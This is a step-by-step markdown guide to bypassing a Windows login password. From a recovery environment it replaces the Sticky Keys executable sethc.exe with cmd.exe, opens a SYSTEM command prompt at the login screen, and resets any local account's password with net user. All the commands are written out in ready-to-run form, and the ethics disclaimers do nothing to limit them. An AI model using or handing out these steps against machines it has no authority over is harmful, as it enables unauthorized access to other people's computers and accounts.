✅ Sticky Keys Method – Bypass Windows Password

````markdown
# 🛠️ Bypass Windows Password Using Sticky Keys (`sethc.exe`)

This method leverages the Sticky Keys feature in Windows by replacing its executable with `cmd.exe`. Once replaced, pressing the **Shift key five times** at the login screen opens a **system-level Command Prompt**, allowing you to reset the password of any local user account.

> ⚠️ Use only on systems you are authorized to access.

---

## 🧰 What You Need

- A Windows installation or recovery USB/DVD
- Physical access to the target system

---

## 🚀 Steps to Bypass Password

### 1️⃣ Boot Into Recovery Environment

1. Insert Windows bootable media and restart the PC.
2. On the setup screen, press `Shift + F10` to open **Command Prompt**.

---

### 2️⃣ Backup Original Sticky Keys Executable

```cmd
copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc.bak
````

✔️ This saves a backup of the original Sticky Keys program.

---

### 3️⃣ Replace Sticky Keys With Command Prompt

```cmd
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe /y
```

✔️ Now, pressing `Shift` 5 times at the login screen will open CMD.

---

### 4️⃣ Restart and Access Command Prompt

1. Remove the bootable USB/DVD and restart the computer.
2. At the Windows login screen, press **Shift** 5 times.

✅ A **Command Prompt with SYSTEM privileges** should open.

---

### 5️⃣ Reset the Password

1. List admin accounts:

   ```cmd
   net localgroup administrators
   ```

2. Reset the password of your desired user:

   ```cmd
   net user <username> *
   ```

✅ Enter and confirm the new password when prompted.

---

### 6️⃣ Restore the Original `sethc.exe` (Optional but Recommended)

After logging in:

```cmd
copy C:\Windows\System32\sethc.bak C:\Windows\System32\sethc.exe /y
```

---

## ⚠️ Notes

* This method won't work if the system drive is encrypted (e.g., BitLocker).
* Must be run with physical access and from recovery environment.
* Ethical use only — never apply on unauthorized systems.

---

## 🛡️ Legal Disclaimer

This technique is for:

* Educational and ethical hacking purposes
* Recovery of your own or authorized systems

❌ Unauthorized use is strictly prohibited.

---

🔐 *Reset smart. Stay ethical.*
